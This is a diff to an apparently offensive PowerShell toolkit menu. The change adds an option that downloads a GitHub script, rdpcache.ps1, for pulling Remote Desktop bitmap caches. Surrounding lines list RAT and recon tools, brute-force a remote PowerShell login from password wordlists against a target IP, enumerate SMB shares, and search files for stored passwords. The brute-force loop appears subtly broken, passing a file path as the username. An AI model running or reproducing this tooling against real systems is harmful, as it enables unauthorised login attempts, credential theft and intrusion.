@@ -174,7 +174,7 @@ while($true){
     write-host "RAT";
     write-host " 213. FortyNorthSecurity/WMImplant`t`t`t275. quasar/Quasar.v1.4.0";
     write-host "RDP";
-    write-host " 146. 3gstudent/List-RDP-Connections-History";
+    write-host " 146. 3gstudent/List-RDP-Connections-History`t`t`t286. Viralmaniar/Remote-Desktop-Caching";
     write-host "RECON";
     write-host " 49. PowerShellMafia/PowerSploit/Recon`t`t`t`t167. xorrior/RemoteRecon";
     write-host "REST";
@@ -476,6 +476,7 @@ while($true){
         '283' {$IP = read-host "Digit an IP target"; if($IP -ne ""){$DOMAIN = read-host "Digit a Domain name"; if($DOMAIN -ne ""){$USER = read-host "Digit a wordlist username file path"; if(test-path $USER){$FILE = read-host "Digit a wordlist password file path"; if(test-path $FILE){foreach($TENT in get-content $FILE){$PW = convertto-securestring -asplaintext -force -string $TENT;	$CRED = new-object -typename system.management.automation.pscredential -argumentlist $DOMAIN\$USER,$PW; enter-pssession -computername $IP -credential $CRED}}}}}}
         '284' {write-host "Digit a specific host or a smb name"; $LHST = read-host "(example, VM1 or empty for all)"; if($LHST -ne ""){Get-SmbShare -Name $LHST | Format-List -Property *}else{Get-SmbShare | Format-List -Property *}}
         '285' {write-host "Digit a specific path with extension"; $EXT = read-host "(example, *.xml)"; if($EXT -ne ""){write-host "Digit a regular expression, use a pipe to search more words"; $RGX = read-host "(example, passws|password)"; if($RGX -ne ""){get-childitem -recurse $EXT|select-string -pattern $RGX}}}
+        '286' {Scarica "Viralmaniar/Remote-Desktop-Caching" "rdpcache.ps1" "Viralmaniar/Remote-Desktop-Caching-/master/rdpcache.ps1"}
         default{write-host 'ERROR: this choice is incorrect'}
     }
 }
